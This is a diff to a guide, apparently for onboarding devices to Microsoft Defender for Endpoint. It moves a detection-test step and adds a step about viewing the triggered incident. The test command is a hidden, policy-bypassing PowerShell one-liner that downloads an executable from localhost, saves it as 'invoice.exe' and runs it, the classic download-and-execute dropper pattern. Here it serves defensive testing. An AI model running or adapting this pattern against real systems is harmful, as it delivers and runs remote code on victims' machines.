@@ -21,5 +21,8 @@ Tip: If your browser is blocking the download, take an action in the browser to 
 1. To verify that the device is properly onboarded and reporting to the service,run the detection script on the newly onboarded device:
 2. Open a Command Prompt window
 3.  At the prompt, copy and run the command below. The Command Prompt window will close automatically.
+   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
 
-powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
+4.  Go to incident and alert to view the incident that was triggered by the command
+
+![GitHub Logo](https://media-hosting.imagekit.io//e6ab57b3dc4149ee/powershell%20endpoint%20incident.png?Expires=1835438079&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=Xyidj0uFEVcFhGHdwJVmA0PKbjNbTT79L0ByRm0YfGpZJbVYqj5oBfOE5jkTm-eTgT3dLrawRi-cbUtMG0UoPR1KQ8C2~2U11gxWtPRv9oO6KVGFdSbPtDzR9TVONkYW2W1HSssPKU00T6qpM9DA4YwvvG4ZXo2XE~owa-2qGL7o4cY1vyKDcHdExnks-puUhTXJs~UhQjK8ubIMLsBXyL14ONaA-PggNaA0kpdcyMesbMufrdkssYqWDn0lmS0rVz4G4tOzzPf~5719C~NoGE9Y5rf0koN1Bz1QGtNyhRD-CEquKv8zLikpD7ObsAje-ZNH2Amiv0OHSRWJ-igxTg__)
